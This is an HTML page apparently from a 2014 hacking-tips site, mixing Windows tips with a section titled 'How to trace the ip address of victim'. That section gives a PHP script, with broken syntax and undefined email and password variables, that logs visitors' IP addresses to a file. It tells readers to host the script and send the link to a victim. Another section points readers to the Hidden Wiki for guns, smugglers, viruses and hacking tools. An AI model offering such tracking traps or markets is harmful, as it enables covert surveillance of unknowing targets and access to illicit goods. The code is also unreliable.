<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>News2</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="" />
	<meta name="keywords" content="" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.4" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link href="css/99.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance600" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="News-1/" target="_self" title="News">News</a></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li></ul></div><div id="wb_element_instance601" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle"><span class="wb-stl-special"><span style="color:#bebebe;">HakTuts</span></span></h4>
</div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance605" class="wb_element" style=" line-height: normal;"><h2 class="wb-stl-heading2">How to trace the ip address of victim.</h2>

<p class="wb-stl-normal"><br>
&lt;?php<br>
$ip = $_SERVER['REMOTE_ADDR'];<br>
$dt = date("l ds \of F Y h:i:s A");<br>
$file=fopen("ip_log.txt","a");<br>
&amp;data = $email.' '.' '.$pass.' '.' '.$ip.'<br>
'.$dt."\n";<br>
fwrite($file, $data);<br>
fclose($file);<br>
header( 'Location: http://your website.com/');<br>
?&gt; ""<br>
Copy the above code in a notepad (without quotes) and save it as ip.php<br>
Now make a other notepad with name ip_log in ip_log all the ip will be stored<br>
Now what u have to do is find a free webs hosting site <strong>i.e 000.webhost.com</strong> and upload both the files in root directory i.e. ip.php and ip_log<br>
and link will be generated when u give this link to any victim his ip will be save in ip_log file as soon as it clicks on the link .<br>
 </p>

<p class="wb-stl-normal"> </p>

<h2 class="wb-stl-heading2">Hidden wiki</h2>

<p class="wb-stl-normal">      1. <a data-target="true" data-type="url" data-url="http://thehiddenwiki.org/" href="http://thehiddenwiki.org/" target="_blank">goto</a> http://thehiddenwiki.org</p>

<p class="wb-stl-normal">         here you can get the list of privacy protected search engine,Paypal account,bitcoin wallet,ammo      </p>

<p class="wb-stl-normal">         and guns dealer,smuggler,hacking tools and virus etc....</p>

<h2 class="wb-stl-heading2"> </h2>

<h2 class="wb-stl-heading2">How to remove the recycle bin from the desktop</h2>

<p> </p>

<p><span style="color:#bebebe;">        If you don't use the Recycle Bin to store deleted files , you can get rid of its desktop icon all together.</span></p>

<p><span style="color:#bebebe;">        Run Regedit and go to: </span></p>

<p><span style="color:#bebebe;">        HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/explorer/Desktop/NameSpace</span></p>

<p><span style="color:#bebebe;">        Click on the "Recycle Bin" string in the right hand pane. Hit Del, click OK.</span></p>

<p> </p>

<h2 class="wb-stl-heading2"> </h2>

<h2 class="wb-stl-heading2"><span style="color:#bebebe;">Steps to remove virus from pendrive</span></h2>

<p> </p>

<p><span style="color:#bebebe;">        Virus Type=create shortcut of all available pendrive file or data</span></p>

<p><span style="color:#bebebe;">        Click on "Start" --&gt;Run --&gt; type cmd and click on OK.</span></p>

<p><span style="color:#bebebe;">        Here I assume your External hard drive as G:</span></p>

<p><span style="color:#bebebe;">        Enter this command.</span></p>

<p><span style="color:#bebebe;">        attrib -h -r -s /s /d g:\*.*</span></p>

<p><span style="color:#bebebe;">        You can copy the above command --&gt; Right-click in the Command Prompt and</span></p>

<p><span style="color:#bebebe;">        paste it.</span></p>

<p><span style="color:#bebebe;">        Note : Replace the letter g with your External hard drive letter.</span></p>

<p><span style="color:#bebebe;">        Now check for your files in External Drive.</span></p>

<p> </p>

<h2 class="wb-stl-heading2"><span style="color:#bebebe;">How to get info of caller identity in pc</span></h2>

<p> </p>

<p><span style="color:#bebebe;">     1. goto http://www.bollywoodmotion.com/mobile-tracker-with-name.html</span></p>

<p> </p>

<p><span style="color:#bebebe;">      How to get info of caller identity in smartphone</span></p>

<p><span style="color:#bebebe;">      1. Install android apllication "Truecaller"</span></p>

<p> </p>
</div><div id="wb_element_instance606" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(99);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance606");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance606").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 154px;">
	
<div id="wb_element_instance602" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">The Content of the website is for educational purpose.</p>
</div><div id="wb_element_instance603" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">haktuts © 2014. All Rights Reserved </p>
</div><div id="wb_element_instance604" class="wb_element"><div id="wb_element_instance604_toolbox" style="width: 200px; height: 30px;"><a id="wb_element_instance604_facebook" class="addthis_button_facebook addthis_32x32_style" style="float: left;"></a><a id="wb_element_instance604_twitter" class="addthis_button_twitter addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance604_email" class="addthis_button_email addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance604_google" class="addthis_button_google addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance604_compact" class="addthis_button_compact addthis_32x32_style" style="float: left; margin-left: 4px;"></a></div><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=haktuts.com"></script><script type="text/javascript">
				if (window.addthis) { addthis.toolbox("#wb_element_instance604_toolbox"); }
			</script></div><div id="wb_element_instance607" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>